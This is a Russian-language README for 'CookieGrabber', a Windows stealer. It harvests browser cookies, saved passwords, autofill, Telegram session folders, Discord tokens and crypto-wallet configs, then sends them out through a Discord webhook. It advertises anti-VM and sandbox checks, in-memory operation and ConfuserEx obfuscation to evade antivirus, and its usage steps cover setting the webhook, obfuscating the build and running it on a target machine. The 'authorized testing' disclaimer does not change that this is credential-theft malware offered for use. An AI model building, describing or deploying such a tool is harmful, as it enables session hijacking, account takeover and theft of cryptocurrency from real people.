## CookieGrabber

**CookieGrabber** - это программа для сбора данных на базе Windows для браузеров _Chromium_, _Firefox_, _Telegram_ _Desktop_, _Discord_ и нескольких _криптокошельков_.  
Создана для авторизованного тестирования на проникновение, восстановления персональных данных и исследований в области безопасности.  
Он извлекает файлы _cookie_, сохраненные _пароли_, данные _автозаполнения_, _историю_ посещенных страниц, _закладки_, _токены_ _Discord_, файлы _сеансов Telegram_ и настройки криптокошелька — все это упаковано в зашифрованный ZIP-файл и доставляется через Discord webhook.

### Features

- ** Браузеры на базе Chromium** (Chrome, Edge, Brave, Yandex, Opera, Opera GX, Vivaldi, Chromium):
  - Файлы cookie (файл "Cookies" из `Network/`)
  - Сохраненные пароли ("Данные для входа`)
  - Автозаполнение записей ("Веб-данные")
  - История просмотров ("History")
  - Закладки (`Bookmarks`)
  - Данные расширения MetaMask
- **Firefox**:
  - Файлы cookie (`cookies.sqlite`)
  - Сохраненные логины (`logins.json`)
  - История (`places.sqlite`)
- **Рабочий стол Telegram**:
  - Полный каталог сеансов `tdata` (активный захват сеанса)
- **Discord**:
  - Файлы базы данных локального уровня хранения (извлечение токенов)
- **Криптовалютные кошельки**:
  - Exodus (`exodus.conf.json`)
  - Атомарный кошелек (`config.json`)
- Скрытность и защита от обнаружения**:
  - Защита от виртуальной машины / изолированной среды (проверка времени безотказной работы, проверка оперативной памяти, перечисление процессов изолированной среды)
  - Нет локальных лог—файлов - все остается в памяти
  - Загрузка фрагментами позволяет обойти ограничение Discord на 8 МБ (с проверкой целостности CRC32)
  - Готовность к обфускации: совместимость с ConfuserEx (прилагается конфигурация) для предотвращения обнаружения AV
- **Доставка**: отправляет ZIP-архив (или отдельные части) на веб-сайт Discord с коротким сообщением о состоянии.

### Usage

1. Измените константу `**WebhookUrl**` в CookieGrabber.cs на свой собственный веб-браузер Discord.
2. Скомпилируйте с помощью приведенной выше команды (Visual Studio или standalone csc).
3. (Необязательно) Выполните обфускацию с помощью ConfuserEx, используя "protection.crproj".
4. Запустите `CookieGrabber.exe" на целевом компьютере (только для законного тестирования).

Инструмент автоматически соберет данные, упакует их и отправит на канал Discord.  
Если размер архива превысит 7 МБ, он будет разделен на несколько частей с помощью контрольных сумм CRC32.
